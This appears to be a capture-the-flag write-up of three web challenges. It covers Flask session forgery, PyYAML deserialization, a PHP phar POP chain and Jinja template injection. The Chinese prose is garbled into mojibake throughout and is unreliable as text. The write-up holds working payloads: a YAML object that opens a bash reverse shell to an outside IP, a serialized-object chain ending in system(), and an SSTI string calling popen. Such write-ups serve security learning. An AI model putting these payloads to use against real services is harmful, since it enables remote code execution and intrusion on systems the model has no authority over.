<p>&#x2F;uploadä¸­æœ‰os.path.joinï¼Œå¯èƒ½é€ æˆç»å¯¹è·¯å¾„æ‹¼æ¥æ¼æ´ï¼</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ç»å¯¹è·¯å¾„æ‹¼æ¥æ¼æ´</span><br><span class="line"></span><br><span class="line">os.path.join(path,*paths)å‡½æ•°ç”¨äºå°†å¤šä¸ªæ–‡ä»¶è·¯å¾„è¿æ¥æˆä¸€ä¸ªç»„åˆçš„è·¯å¾„ã€‚ç¬¬ä¸€ä¸ªå‡½æ•°é€šå¸¸åŒ…å«äº†åŸºç¡€è·¯å¾„ï¼Œè€Œä¹‹åçš„æ¯ä¸ªå‚æ•°è¢«å½“ä½œç»„ä»¶æ‹¼æ¥åˆ°åŸºç¡€è·¯å¾„ä¹‹åã€‚</span><br><span class="line"></span><br><span class="line">ç„¶è€Œï¼Œè¿™ä¸ªå‡½æ•°æœ‰ä¸€ä¸ªå°‘æœ‰äººçŸ¥çš„ç‰¹æ€§ï¼Œå¦‚æœæ‹¼æ¥çš„æŸä¸ªè·¯å¾„ä»¥ / å¼€å¤´ï¼Œé‚£ä¹ˆåŒ…æ‹¬åŸºç¡€è·¯å¾„åœ¨å†…çš„æ‰€æœ‰å‰ç¼€è·¯å¾„éƒ½å°†è¢«åˆ é™¤ï¼Œè¯¥è·¯å¾„å°†è§†ä¸ºç»å¯¹è·¯å¾„</span><br></pre></td></tr></table></figure>

<p>å¦‚æœflagåœ¨æ ¹ç›®å½•ä¸‹ä¸”åç§°çŸ¥é“ï¼Œé‚£ä¹ˆå°±æ‹¿ä¸‹äº†</p>
<p><strong>ä½†æ˜¯</strong>ï¼Œç”±äºæ­¤å¤„å­˜åœ¨secure_filenameå‡½æ•°ï¼Œæ‰€ä»¥å°±ä¸è¡Œå•¦ï¼ï¼</p>
<p>å†çœ‹çœ‹&#x2F;boogipopè·¯ç”±ï¼Œyaml.full_load(f)ï¼Œå¯èƒ½å­˜åœ¨PyYamlååºåˆ—åŒ–</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/boogipop&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">load</span>():</span><br><span class="line">    <span class="keyword">if</span> session.get(<span class="string">&quot;passport&quot;</span>) == <span class="string">&quot;Welcome To HDCTF2023&quot;</span>:</span><br><span class="line">        LoadedFile = request.args.get(<span class="string">&quot;file&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(LoadedFile):</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;file not exists&quot;</span></span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(LoadedFile) <span class="keyword">as</span> f:</span><br><span class="line">            yaml.full_load(f)</span><br><span class="line">            f.close()</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;van you see&quot;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;No Auth bro&quot;</span></span><br></pre></td></tr></table></figure>

<p>é¦–å…ˆè¿™é‡Œæˆ‘ä»¬é¢ä¸´çš„æ˜¯sessionä¼ªé€ </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">random.seed(uuid.getnode())</span><br><span class="line">app.config[&#x27;SECRET_KEY&#x27;] = str(random.random() * 233)</span><br></pre></td></tr></table></figure>

<p>æ³¨æ„çœ‹è¿™é‡Œçš„uuid.getnode()ï¼Œ<code>uuid.getnode()</code> è¿”å›è®¡ç®—æœºçš„<strong>ç½‘ç»œæ¥å£å¡ï¼ˆNICï¼‰åœ°å€</strong>ï¼Œé€šå¸¸æ˜¯è®¾å¤‡çš„ MAC åœ°å€ã€‚</p>
<img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241204190138226.png" alt="image-20241204190138226" style="zoom:80%;" />

<p>å°è¯•ä¸€ä¸‹è¯»å–file:&#x2F;&#x2F;&#x2F;sys&#x2F;class&#x2F;net&#x2F;eth0&#x2F;address</p>
<p>æˆåŠŸè¯»å–</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">02:42:ac:02:53:60 </span><br></pre></td></tr></table></figure>

<p>é‚£æ¥ä¸‹æ¥æˆ‘ä»¬ç”¨pythonè·‘ä¸€ä¸‹secret_key</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line">random.seed(<span class="number">0x0242ac025360</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">str</span>(random.random() * <span class="number">233</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment">#186.07856094331362</span></span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eyJwYXNzcG9ydCI6IllhbWlZYW1pIn0.Z1A35A.Asx0C_ayFAFrjis7qY4WWiXNYEU</span><br></pre></td></tr></table></figure>

<p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241204191236394.png" alt="image-20241204191236394"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eyJwYXNzcG9ydCI6IldlbGNvbWUgVG8gSERDVEYyMDIzIn0.Z1A5HQ.XcVLAuoOz8HI6SqclVREZ0FH3dE</span><br></pre></td></tr></table></figure>

<p>&#x2F;boogipopè·¯ç”±ä¸‹å¹²çš„å…¶å®å°±æ˜¯æ¥æ”¶ä¸€ä¸ªfileï¼Œç„¶åå®ƒä¼šå»æŸ¥çœ‹æ˜¯å¦å­˜åœ¨ï¼Œè‹¥å­˜åœ¨åˆ™yaml.full_load<br>æ‰€ä»¥æˆ‘ä»¬è¦å…ˆå»ä¸Šä¼ ä¸€ä¸ªæ¶æ„çš„yamlæ–‡ä»¶</p>
<p>ç”±äºè¿™é‡Œæ˜¯full_load()</p>
<p>æˆ‘ä»¬è¦æƒ³åŠæ³•å»çªç ´ï¼Œç”¨extendæ–¹æ³•è¯•è¯•åå¼¹shell</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">!!python/object/new:type</span><br><span class="line">args:</span><br><span class="line">  - exp</span><br><span class="line">  - !!python/tuple []</span><br><span class="line">  - &#123;&quot;extend&quot;: !!python/name:exec &#125;</span><br><span class="line">listitems: &quot;__import__(&#x27;os&#x27;).system(&#x27;bash -c \&quot;bash -i &gt;&amp; /dev/tcp/156.238.233.113/4567 0&gt;&amp;1\&quot;&#x27;)&quot;</span><br></pre></td></tr></table></figure>

<p>è¿™é‡Œæˆ‘ä»¬åˆ›å»ºä¸€ä¸ª1.txtå°±å¥½äº†ï¼Œå…¶ä»–åç¼€éƒ½è¢«è¿‡æ»¤äº†</p>
<p>ä¸Šä¼ åˆ°&#x2F;uploads&#x2F;1.txt</p>
<p>ç„¶ååˆ°&#x2F;boogipopè·¯ç”±ä¸‹è¿›è¡Œååºåˆ—åŒ–å³å¯ï¼Œè¿™é‡Œæ³¨æ„æ”¹session</p>
<img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241204191947252.png" alt="image-20241204191947252" style="zoom:80%;" />

<p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241204192022368.png" alt="image-20241204192022368"></p>
<p>çŸ¥è¯†ç‚¹æŒºå¤šçš„ï¼Œè¿˜æ˜¯éå¸¸é€‚åˆå­¦ä¹ çš„ï¼ï¼</p>
<h2 id="SWPUCTF-2021-æ–°ç”Ÿèµ›-babyunser"><a href="#SWPUCTF-2021-æ–°ç”Ÿèµ›-babyunser" class="headerlink" title="[SWPUCTF 2021 æ–°ç”Ÿèµ›]babyunser"></a>[SWPUCTF 2021 æ–°ç”Ÿèµ›]babyunser</h2><p>æ‰“å¼€å°±ä¸¤ä¸ªåŠŸèƒ½ç‚¹</p>
<img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241205101557977.png" alt="image-20241205101557977" style="zoom:80%;" />

<p>ä¸€ä¸ªä¸Šä¼ æ–‡ä»¶ï¼Œä¸€ä¸ªæŸ¥çœ‹æ–‡ä»¶</p>
<p>æ ¹æ®é¢˜ç›®å°±çŸ¥é“ä¸ååºåˆ—åŒ–æœ‰å…³ï¼Œphpæ¶æ„ï¼ŒçŒœæµ‹ä¸ºpharååºåˆ—åŒ–ã€‚</p>
<p>å…ˆæ‰«ç›®å½•çœ‹çœ‹</p>
<p>æ²¡æœ‰ä»€ä¹ˆæœ‰ä»·å€¼çš„ã€‚</p>
<p>é‚£ä¹ˆçœ‹çœ‹æŸ¥çœ‹æ–‡ä»¶è¿™ä¸ªåŠŸèƒ½ç‚¹ï¼Œå¯èƒ½å’Œä»»æ„æ–‡ä»¶è¯»å–æœ‰å…³</p>
<img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241205102042424.png" alt="image-20241205102042424" style="zoom: 80%;" />

<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="meta">include(&#x27;class.php&#x27;);</span></span><br><span class="line"><span class="meta">$a=new aa();</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>aaçš„æ–‡ä»¶æŸ¥çœ‹å™¨<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">class</span>=<span class="string">&quot;search_form&quot;</span> <span class="attr">action</span>=<span class="string">&quot;&quot;</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">class</span>=<span class="string">&quot;input_text&quot;</span> <span class="attr">placeholder</span>=<span class="string">&quot;è¯·è¾“å…¥æœç´¢å†…å®¹&quot;</span> <span class="attr">name</span>=<span class="string">&quot;file&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;æŸ¥çœ‹&quot;</span> <span class="attr">class</span>=<span class="string">&quot;input_sub&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="meta">error_reporting(0);</span></span><br><span class="line"><span class="meta">$filename=$_POST[&#x27;file&#x27;];</span></span><br><span class="line"><span class="meta">if(!isset($filename))&#123;</span></span><br><span class="line"><span class="meta">    die();</span></span><br><span class="line"><span class="meta">&#125;</span></span><br><span class="line"><span class="meta">$file=new zz($filename);</span></span><br><span class="line"><span class="meta">$contents=$file-&gt;getFile();</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">textarea</span> <span class="attr">class</span>=<span class="string">&quot;file_content&quot;</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">value</span>=&lt;?<span class="attr">php</span> <span class="attr">echo</span> &quot;&lt;<span class="attr">br</span>&gt;</span>&quot;.$contents;?&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>é‡Œé¢åŒ…å«äº†class.phpï¼Œé‚£ä¹ˆæˆ‘ä»¬å†è¯»å–ä¸€ä¸‹class.php</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">aa</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;name=<span class="string">&#x27;aa&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;name=<span class="title function_ invoke__">strtolower</span>(<span class="variable">$this</span>-&gt;name);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ff</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$content</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$func</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;content=<span class="string">&quot;\&lt;?php @eval(\$_POST[1]);?&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$key</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="variable">$key</span>-&gt;&#123;<span class="variable language_">$this</span>-&gt;func&#125;(<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">zz</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$content</span>=<span class="string">&#x27;surprise&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$filename</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;filename=<span class="variable">$filename</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^\/|php:|data|zip|\.\.\//i&#x27;</span>,<span class="variable">$this</span>-&gt;filename))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;è¿™ä¸åˆç†&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">write</span>(<span class="params"><span class="variable">$var</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$filename</span>=<span class="variable language_">$this</span>-&gt;filename;</span><br><span class="line">        <span class="variable">$lt</span>=<span class="variable language_">$this</span>-&gt;filename-&gt;<span class="variable">$var</span>;</span><br><span class="line">        <span class="comment">//æ­¤åŠŸèƒ½åºŸå¼ƒï¼Œä¸æƒ³å†™äº†</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getFile</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">filter</span>();</span><br><span class="line">        <span class="variable">$contents</span>=<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$this</span>-&gt;filename);</span><br><span class="line">        <span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable">$contents</span>))&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable">$contents</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;404 not found&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;&#123;<span class="variable">$_POST</span>[<span class="string">&#x27;method&#x27;</span>]&#125;(<span class="variable">$_POST</span>[<span class="string">&#x27;var&#x27;</span>]);</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;content;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">xx</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$arg</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;name=<span class="string">&#x27;eval&#x27;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;arg=<span class="string">&#x27;phpinfo();&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$name</span>,<span class="variable">$arg</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$name</span>(<span class="variable">$arg</span>[<span class="number">0</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>æ„é€ é“¾å­</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">aa</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ff</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$content</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$func</span>=<span class="string">&quot;assert&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;content=<span class="keyword">new</span> <span class="title function_ invoke__">xx</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$key</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="variable">$key</span>-&gt;&#123;<span class="variable language_">$this</span>-&gt;func&#125;(<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">zz</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$content</span>=<span class="string">&#x27;surprise&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">write</span>(<span class="params"><span class="variable">$var</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$filename</span>=<span class="variable language_">$this</span>-&gt;filename;</span><br><span class="line">        <span class="variable">$lt</span>=<span class="variable language_">$this</span>-&gt;filename-&gt;<span class="variable">$var</span>;</span><br><span class="line">        <span class="comment">//æ­¤åŠŸèƒ½åºŸå¼ƒï¼Œä¸æƒ³å†™äº†</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;&#123;<span class="variable">$_POST</span>[<span class="string">&#x27;method&#x27;</span>]&#125;(<span class="variable">$_POST</span>[<span class="string">&#x27;var&#x27;</span>]);</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;content;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">xx</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$arg</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;name=<span class="string">&#x27;system&#x27;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;arg=<span class="string">&#x27;ls /&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$name</span>,<span class="variable">$arg</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$name</span>(<span class="variable">$arg</span>[<span class="number">0</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title function_ invoke__">aa</span>();</span><br><span class="line"><span class="variable">$z</span>=<span class="keyword">new</span> <span class="title function_ invoke__">zz</span>();</span><br><span class="line"><span class="variable">$f</span>=<span class="keyword">new</span> <span class="title function_ invoke__">ff</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;name=<span class="variable">$z</span>;</span><br><span class="line"><span class="variable">$z</span>-&gt;filename=<span class="variable">$f</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"></span><br><span class="line">@<span class="title function_ invoke__">unlink</span>(<span class="string">&#x27;test.phar&#x27;</span>);<span class="comment">//åˆ é™¤ä¹‹å‰çš„test.pharæ–‡ä»¶(å¦‚æœæœ‰)</span></span><br><span class="line"><span class="variable">$phar</span> = <span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&#x27;test.phar&#x27;</span>);<span class="comment">//åˆ›å»ºä¸€ä¸ªpharå¯¹è±¡ï¼Œæ–‡ä»¶åå¿…é¡»ä»¥pharä¸ºåç¼€</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">startBuffering</span>();<span class="comment">//å¼€å§‹å†™æ–‡ä»¶</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setStub</span>(<span class="string">&#x27;&lt;?php __HALT_COMPILER();?&gt;&#x27;</span>);<span class="comment">//å†™å…¥stub</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setMetadata</span>(<span class="variable">$a</span>);<span class="comment">//å†™å…¥meta-data</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&#x27;test.txt&#x27;</span>,<span class="string">&#x27;test&#x27;</span>);<span class="comment">//æ·»åŠ è¦å‹ç¼©çš„æ–‡ä»¶</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">stopBuffering</span>();</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aa::__destruct() -&gt; zz::__toString() -&gt; zz::write() -&gt; ff:__get() -&gt; xx::__call()</span><br></pre></td></tr></table></figure>



<p><img src="C:\Users\TY\AppData\Roaming\Typora\typora-user-images\image-20241205105221482.png" alt="image-20241205105221482"></p>
<h2 id="HNCTF-2022-WEEK3-ssssti"><a href="#HNCTF-2022-WEEK3-ssssti" class="headerlink" title="[HNCTF 2022 WEEK3]ssssti"></a>[HNCTF 2022 WEEK3]ssssti</h2><p>è¿™é‡Œç›´æ¥ç»™å‡ºpayload</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?name=&#123;&#123;(lipsum|attr(request.values.a)).get(request.values.b).popen(request.values.c).read()&#125;&#125;&amp;a=__globals__&amp;b=os&amp;c=cat flag</span><br></pre></td></tr></table></figure>





